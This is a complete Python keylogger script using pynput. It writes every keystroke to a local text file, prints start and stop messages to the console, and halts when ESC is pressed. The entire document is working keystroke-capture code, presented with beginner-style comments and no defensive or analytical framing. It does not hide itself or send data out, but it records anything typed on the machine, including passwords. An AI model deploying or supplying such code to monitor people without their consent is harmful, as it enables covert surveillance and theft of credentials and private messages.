from pynput import keyboard

# This will save the keys to this file
log_file = "key_log.txt"

# This function runs whenever a key is pressed
def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

# This function stops the keylogger when ESC is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        print("🔒 Stopped logging.")
        return False

# Start listening to the keyboard
print("🟢 Keylogger is running... (Press ESC to stop)")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
